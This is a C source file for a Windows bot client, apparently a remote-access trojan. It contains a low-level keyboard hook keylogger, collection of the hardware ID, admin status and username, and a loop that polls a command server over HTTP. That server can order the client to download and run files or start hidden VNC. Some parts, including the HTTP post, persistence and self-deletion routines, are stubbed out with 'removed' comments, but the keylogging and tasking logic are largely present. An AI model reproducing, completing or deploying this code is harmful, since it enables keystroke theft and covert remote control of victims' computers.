#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <windows.h>
#include <WinInet.h>
#include "main.h"
#define CHUNKSIZE 1024

BOOL StartupRun(PCHAR pszAppName, PCHAR pathToExe, PBOOL pbExists)
{
	//removed
	return FALSE;
}

BOOL MeltFile() {
	//removed
	return FALSE;
}
BOOL RegisterStartupService(PCHAR lpszFilePath, PCHAR lpszServiceName) {
	//removed
	return FALSE;
}
BOOL StartupMethod(BOOL bAdmin)
{
	CHAR szPathToExe[MAX_PATH];
	BOOL status = FALSE;
	GetModuleFileNameA(NULL, szPathToExe, MAX_PATH);
	if (bAdmin) {
		BOOL bExists = FALSE;
		status = StartupRun(ServiceName, szPathToExe, &bExists);

		if (bExists && !status)
			status = TRUE;
	}
	else {
		RegisterStartupService(szPathToExe, ServiceName);
	}

	return status;
}
BOOL DownloadAndExecuteFile(PCHAR lpszFileName, PCHAR lpszFileUrl) {

	PBYTE pBuf = NULL;
	DWORD dwSize;
	HANDLE hFile;
	BOOL status = FALSE;
	HANDLE hHeap = NULL;
	hFile = CreateFileA(lpszFileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (GetLastError() == ERROR_FILE_EXISTS) {

		goto cleanup;
	}
//	hHeap = getfile(lpszFileUrl, &pBuf, &dwSize);
	if (!hHeap)
	{
		goto cleanup;
	}
	DWORD dwBytesWritten = 0;
	WriteFile(hFile, pBuf, dwSize, &dwBytesWritten, NULL);
	CloseHandle(hFile);
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	RtlZeroMemory(&si, sizeof(STARTUPINFO));
	RtlZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	si.cb = sizeof(STARTUPINFO);
	CreateProcessA(lpszFileName, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	status = TRUE;


cleanup:
	if (pBuf) {
		HeapFree(hHeap, 0, pBuf);
		pBuf = NULL;
	}

	return status;
}
BOOL HttpPost(PCHAR lpszDomain, PCHAR lpszPage, PCHAR lpszData, DWORD dwData, PCHAR *lpszDest, PDWORD pdwDest, BOOL bRead)
{// removed code
}
/*
* Upon returning true it returns a valid pointer to an allocated buffer holding the HWID. this must be later freed
* upon returning false, lpszHWID points to null
*/
BOOL GetHwid(PCHAR *lpszHwid, PDWORD pdwHwid) {
	BOOL status = FALSE;
	HW_PROFILE_INFOA hwProfileInfoW;
	if (!GetCurrentHwProfileA(&hwProfileInfoW))
		goto cleanup;

	DWORD dwHwidSize = (_strlen(hwProfileInfoW.szHwProfileGuid) + 1);
	if (dwHwidSize <= 0)
		goto cleanup;


	*lpszHwid = HeapAlloc(GetProcessHeap(), 0, dwHwidSize);
	if (!*lpszHwid)
		goto cleanup;

	_ZeroMemory(*lpszHwid, dwHwidSize);
	_memcpy(*lpszHwid, hwProfileInfoW.szHwProfileGuid, dwHwidSize);
	*pdwHwid = dwHwidSize;
	status = TRUE;
cleanup:
	return status;
}
/*
* Queries whether the EXE is running with administrator rights. returns FALSE upon a function fail. returns TRUE upon success of query.
*/
BOOL QueryAdminStatus(PBOOL bAdminStatus) {
	BOOL status = FALSE;
	SID_IDENTIFIER_AUTHORITY pIdentifierAuthority = SECURITY_NT_AUTHORITY;
	PSID pSID = NULL;
	if (AllocateAndInitializeSid(&pIdentifierAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSID)) {
		CheckTokenMembership(NULL, pSID, bAdminStatus);
		FreeSid(pSID);

		status = TRUE;
	}
	return status;
}
/*
* Returns No Admin string or Admin depending on whether the current EXE is running with admin rights.
*
*/
CONST PCHAR IsAdmin() {
	BOOL bIsAdmin = FALSE;

	BOOL status = QueryAdminStatus(&bIsAdmin);
	if (!status)
		goto cleanup;

	if (bIsAdmin) {
		
		return AdminStr;
	}
	else {
		return NotAdminStr;

	}
cleanup:
	return NULL;
}
BOOL SubmitKeylogs(PPOST_DATA PostData) {
	// removed code
	BOOL status = FALSE;
	_ZeroMemory(g_KeyloggerData->ucKeyloggerData, KEYLOGGER_BUFFER_SIZE);
	return TRUE;
	
}
LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {

	if (g_KeyloggerData->dwKeys >= KEYLOGGER_BUFFER_SIZE) {
		SubmitKeylogs(g_PostData);
	}
	KBDLLHOOKSTRUCT* data = (KBDLLHOOKSTRUCT*)lParam;
	switch (wParam) {
	case WM_KEYDOWN: {
		DWORD vk = data->vkCode;

		BOOL isAlpha = IS_ALPHA_NUM(vk);
		switch (isAlpha) {

		case TRUE:
		{
			UINT k = MapVirtualKeyA(vk, MAPVK_VK_TO_CHAR);
			g_KeyloggerData->ucKeyloggerData[g_KeyloggerData->dwKeys] = k;
			g_KeyloggerData->dwKeys++;
		}
		break;
		INT dwLen = 0;
		case FALSE: {

		} //end false statemtns
		}//end switch
	}
					 break;
	default:
		break;
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);

}
DWORD WINAPI KeyloggerThread(LPVOID lpParam) {
	HHOOK hhKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, GetModuleHandle(NULL), 0);
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(hhKeyboardHook);
	return 0;
}


BOOL RandomString(PCHAR *lpszRandomStr) {
	*lpszRandomStr = NULL;
	return FALSE;
	// removed code.
}
BOOL HttpStatusPost(DWORD dwCmdId, BOOL Result) {
	DWORD dwSize = g_PostData->dwHwid + g_PostData->dwRandom1 + g_PostData->dwRandom2 + g_PostData->dwRandom3 + 8 + 20 + 12;
	PCHAR lpszSuccessPacket = HeapAlloc(GetProcessHeap(), 0, dwSize);
	if (!lpszSuccessPacket)
		goto cleanup;
	_ZeroMemory(lpszSuccessPacket, dwSize);
	wsprintfA(lpszSuccessPacket, PostDataSuccessFormat, g_PostData->lpszRandomParam1, g_PostData->lpszHwid, g_PostData->lpszRandomParam2, dwCmdId, g_PostData->lpszRandomParam3, Result, ExtraStr, ExtraStr);
	
	HttpPost(HOST, PAGE, lpszSuccessPacket, _strlen(lpszSuccessPacket), NULL, NULL, FALSE);
cleanup:
	
	if (lpszSuccessPacket) {
		HeapFree(GetProcessHeap(), 0, lpszSuccessPacket);
		lpszSuccessPacket = NULL;
	}
}
DWORD WINAPI PostRoutine(LPVOID lpParam) {

	PCHAR lpszPostData = NULL, lpszPostDataReal = NULL;

	DWORD dwPostData = g_PostData->dwHwid + g_PostData->dwAdmin + 6 + g_PostData->dwRandom1 + g_PostData->dwRandom2 + g_PostData->dwRandom3 + g_PostData->dwUserAccount;
	DWORD dwBytesToAllocate = dwPostData + 1;
	lpszPostData = HeapAlloc(GetProcessHeap(), 0, dwBytesToAllocate);
	if (!lpszPostData)
		goto cleanup;

	_ZeroMemory(lpszPostData, dwBytesToAllocate);
	wsprintfA(lpszPostData, PostDataFormat, g_PostData->lpszRandomParam1, g_PostData->lpszHwid, g_PostData->lpszRandomParam2, g_PostData->lpszAdmin, g_PostData->lpszRandomParam3, g_PostData->lpszUserAccount);

	for (;;) {
		PCHAR lpszData = NULL;
		DWORD dwData = 0;
		nx_json* json = NULL;

		HttpPost(HOST, PAGE, lpszPostData, strlen(lpszPostData), &lpszData, &dwData, TRUE);

		json = nx_json_parse(lpszData, 0);
		if (!json)
			goto cleanup_read;

		const nx_json* arr = nx_json_get(json, TasksStr);
		if (!arr)
			goto cleanup_read;

		for (int i = 0; i < arr->length; i++) {
			const nx_json* item = nx_json_item(arr, i);
			if (!item)
				continue;

			for (int z = 0; z < item->length; z++) {
				int command = (nx_json_item(item, z)->int_value);
	
				z++;
				switch (command) {
				case DOWNLOAD_EXECUTE: {
					LPCSTR lpszUrl = nx_json_item(item, z)->text_value;
					// we dont really send shit back to the server soooo ya
					BOOL Status = DownloadAndExecuteFile("filename.exe", lpszUrl);
					z++;
					HttpStatusPost(nx_json_item(item, z)->int_value, Status);
				}
					break;
				case START_HVNC: {

					LPCSTR lpszHost = nx_json_item(item, z)->text_value;
					BOOL Status = FALSE;
					//CreateThread(NULL, 0, HVNCThread, lpszHost, 0, NULL);
					Status = TRUE;
					z++;
					HttpStatusPost(nx_json_item(item, z)->int_value, Status);
				}
					break;
				default: break;
				}
			}
			HeapFree(GetProcessHeap(), 0, item);
		}
	cleanup_read:

		if (json) {
			HeapFree(GetProcessHeap(), 0, json);
			json = NULL;
		}
		if (lpszData) {
			HeapFree(GetProcessHeap(), 0, lpszData);
			lpszData = NULL;
		}
		Sleep(SLEEP_TIME);
	}
cleanup:

	if (lpszPostData) {
		HeapFree(GetProcessHeap(), 0, lpszPostData);
		lpszPostData = NULL;
	}

	return TRUE;
}
BOOL GetUserNameComp(PCHAR *lpszAcc, PDWORD pdwAcc) {
	BOOL status = FALSE;
	PCHAR lpszBuf = NULL;
	DWORD dwBytes = 0;
	GetUserNameA(lpszBuf, &dwBytes);
	if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
		*lpszAcc = HeapAlloc(GetProcessHeap(), 0, dwBytes);
		GetUserNameA(*lpszAcc, &dwBytes); 
		*pdwAcc = (dwBytes - 1);
		status = TRUE;
	}
	return status;
}

int main() {
	BOOL status = FALSE, bIsAdmin = FALSE;
	HANDLE hPostThread = NULL, hKeyloggerThread = NULL;
	HMODULE hNtdll = LoadLibrary(L"ntdll.dll"), hAdvapi32 = LoadLibrary(L"advapi32.dll");
	for (int i = 0; i < sizeof(EncryptedStrings); i++) {
		RtlZeroMemory(EncryptedStrings[i].lpszDest, EncryptedStrings[i].dwDestSize);
		PCHAR dec_str = hex_to_bytes("4D6F7A696C6C612F352E30202857696E646F7773204E5420362E313B2057696E36343B207836343B2072763A34372E3029204765636B6F2F32303130303130312046697265666F782F34372E30");
		strcpy(EncryptedStrings[i].lpszDest, dec_str);

		printf("EncryptedStrings[i].lpszDest %s\n", EncryptedStrings[i].lpszDest);
		getchar();

	}
	getchar();
	_RtlRandomEx = (__RtlRandomEx)GetProcAddress(hNtdll, "RtlRandomEx");
	_RtlGenRandom = (__RtlGenRandom)GetProcAddress(hAdvapi32, "SystemFunction036");

	MeltFile();
	
	
	status = QueryAdminStatus(&bIsAdmin);
	if (!status)
		goto cleanup;

	StartupMethod(bIsAdmin);
	g_KeyloggerData = HeapAlloc(GetProcessHeap(), 0, sizeof(KEYLOGGER_DATA));
	_ZeroMemory(g_KeyloggerData, sizeof(KEYLOGGER_DATA));
	g_PostData = HeapAlloc(GetProcessHeap(), 0, sizeof(POST_DATA));

	_ZeroMemory(g_PostData, sizeof(POST_DATA));

	status = GetHwid(&g_PostData->lpszHwid, &g_PostData->dwHwid);
	if (!status || !g_PostData->lpszHwid)
		goto cleanup;


	g_PostData->lpszAdmin = IsAdmin(&g_PostData->lpszAdmin);
	if (!g_PostData->lpszAdmin)
		goto cleanup;


	status = RandomString(&g_PostData->lpszRandomParam1);
	if (!status || !g_PostData->lpszRandomParam1)
		goto cleanup;

	g_PostData->dwRandom1 = _strlen(g_PostData->lpszRandomParam1);

	status = RandomString(&g_PostData->lpszRandomParam2);
	if (!status || !g_PostData->lpszRandomParam2)
		goto cleanup;

	g_PostData->dwRandom2 = _strlen(g_PostData->lpszRandomParam2);


	status = RandomString(&g_PostData->lpszRandomParam3);
	if (!status || !g_PostData->lpszRandomParam3)
		goto cleanup;

	g_PostData->dwRandom3 = _strlen(g_PostData->lpszRandomParam3);


	GetUserNameComp(&g_PostData->lpszUserAccount, &g_PostData->dwUserAccount);
	
	
	hPostThread = CreateThread(NULL, 0, PostRoutine, NULL, 0, NULL);
	if (!hPostThread)
		goto cleanup;
	hKeyloggerThread = CreateThread(NULL, 0, KeyloggerThread, NULL, 0, NULL);
	if (!hKeyloggerThread)
		goto cleanup;
cleanup:
	if(hPostThread)
		WaitForSingleObject(hPostThread, INFINITE);
	
	if(hKeyloggerThread)
		WaitForSingleObject(hKeyloggerThread, INFINITE);
	
	if (g_PostData->lpszUserAccount) {
		HeapFree(GetProcessHeap(), 0, g_PostData->lpszUserAccount);
		g_PostData->lpszUserAccount = NULL;
	}
	if (g_PostData->lpszRandomParam3) {
		HeapFree(GetProcessHeap(), 0, g_PostData->lpszRandomParam3);
		g_PostData->lpszRandomParam3 = NULL;
	}
	if (g_PostData->lpszRandomParam2) {
		HeapFree(GetProcessHeap(), 0, g_PostData->lpszRandomParam2);
		g_PostData->lpszRandomParam2 = NULL;
	}
	if (g_PostData->lpszRandomParam1) {
		HeapFree(GetProcessHeap(), 0, g_PostData->lpszRandomParam1);
		g_PostData->lpszRandomParam1 = NULL;
	}
	if (g_PostData->lpszHwid){
		HeapFree(GetProcessHeap(), 0, g_PostData->lpszHwid);
		g_PostData->lpszHwid = NULL;
	}
	if (g_PostData) {
		HeapFree(GetProcessHeap(), 0, g_PostData);
		g_PostData = NULL;
	}
	if (g_KeyloggerData) {
		HeapFree(GetProcessHeap(), 0, g_KeyloggerData);
		g_KeyloggerData = NULL;
	}
	return status;
}